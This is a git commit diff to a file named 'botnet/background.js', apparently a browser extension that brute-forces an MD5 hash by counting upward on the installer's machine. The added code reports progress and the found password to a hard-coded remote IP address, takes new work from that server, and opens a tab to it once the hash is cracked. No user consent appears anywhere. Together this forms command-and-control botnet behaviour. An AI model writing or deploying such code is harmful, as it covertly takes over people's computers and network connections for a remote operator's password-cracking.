15d21f7714ce0b3e5e5c28e115de21c2102c9384
tinkrmind <tinkrmind@gmail.com>
2018-05-02 16:51:29 -0400

    Added hurray page. md5 issue solved.

--- botnet/background.js
+++ botnet/background.js
@@ -1,4 +1,5 @@
-var solved = true;
+var solved = false;
+var password = -1;
 sendData(solved, 0);
 
 function doStuff(num, callback){
@@ -8,50 +9,52 @@ function doStuff(num, callback){
     num = num+1;
     var hash = md5(""+num);
     // console.log(hash);
-    if(hash == "d413bd07b3d0481281108ec98c09f05f"){
+    if(hash == "e2ffa1458e17ca5ba93db1eea71bc3e8"){ // ~ 1 billion
+    // if(hash == "f58decb455e9937c6b8f54a237a2ca05"){ //~4 million
       console.log(num);
       solved = true;
+      password = num;
       callback(solved, num);
     }
   }
 
-  if (solved = true) {
-    console.log("HURRAY! The password is "+num)
-    // var newURL = "http://stackoverflow.com/";
-    // chrome.tabs.create({ url: newURL });
+  if (solved == true) {
+    console.log("HURRAY! The password is "+password)
+    var newURL = "http://104.236.250.123:8080/hurray";
+    chrome.tabs.create({ url: newURL });
   }
 
   callback(solved, num);
 }
 
 function sendData(solved, num){
-  doStuff(num, sendData);
-  // var xhr = new XMLHttpRequest();
-  //
-  // if(solved == false){
-  //   xhr.open("GET", "http://104.236.250.123:8080/false/"+num, true);
-  //   // xhr.open("GET", "https://www.google.com", true);
-  //   xhr.send();
-  // }
-  // else{
-  //   xhr.open("GET", "http://104.236.250.123:8080/true/"+num, true);
-  //   // xhr.open("GET", "https://www.google.com", true);
-  //   xhr.send();
-  // }
-  //
-  // xhr.onreadystatechange = function() {
-  //   if (xhr.readyState == 4 && xhr.status == 200) {
-  //     var num = parseInt(xhr.responseText);
-  //     if(num < 0){
-  //       solved = true;
-  //     }
-  //     if(solved == false){ // try to solve
-  //       console.log(num);
-  //       doStuff(num, sendData);
-  //     }
-  //     else{ // TODO: solved. do something
-  //
-  //     }
-  //   }
-  // }
+  // doStuff(num, sendData);
+  var xhr = new XMLHttpRequest();
+
+  if(solved == false){
+    xhr.open("GET", "http://104.236.250.123:8080/false/"+num, true);
+    // xhr.open("GET", "https://www.google.com", true);
+    xhr.send();
+  }
+  else{
+    xhr.open("GET", "http://104.236.250.123:8080/true/"+password, true);
+    // xhr.open("GET", "https://www.google.com", true);
+    xhr.send();
+  }
+
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      var num = parseInt(xhr.responseText);
+      if(num < 0){
+        solved = true;
+      }
+      if(solved == false){ // try to solve
+        console.log(num);
+        doStuff(num, sendData);
+      }
+      else{ // TODO: solved. do something
+
+      }
+    }
+  }
 }
